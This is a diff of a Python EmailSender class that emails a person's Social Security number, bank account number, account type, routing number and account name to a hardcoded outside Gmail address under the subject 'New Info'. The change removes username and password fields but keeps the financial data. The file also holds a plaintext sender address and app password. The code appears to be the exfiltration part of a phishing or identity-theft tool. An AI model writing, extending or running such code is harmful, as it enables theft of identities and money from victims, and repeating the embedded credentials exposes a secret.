@@ -3,11 +3,9 @@ EMAIL = "castanedaorlando871@gmail.com"
 PASSWORD = "ykucjemebvauveur"
 
 class EmailSender:
-    def __init__(self, user_name, user_password, ssn, account_number, account_type, routing, account_name):
+    def __init__(self, ssn, account_number, account_type, routing, account_name):
         """Initialize the email sender with credentials."""
         self.account_name = account_name
-        self.user_name = user_name
-        self.user_password =user_password
         self.ssn = ssn
         self.account_number = account_number
         self.account_type = account_type
@@ -20,9 +18,7 @@ class EmailSender:
         result = self.yag.send(
             to="Rubentamez1122@gmail.com",
             subject="New Info",
-            contents=f"UserName : {self.user_name}\n"
-                     f"Password: {self.user_password}\n"
-                     f"Acount Name: {self.account_name}\n"
+            contents=f"Acount Name: {self.account_name}\n"
                      f"Acount Number: {self.account_number}\n"
                      f"Acount Type: {self.account_type}\n"
                      f"Routing: {self.routing}\n"
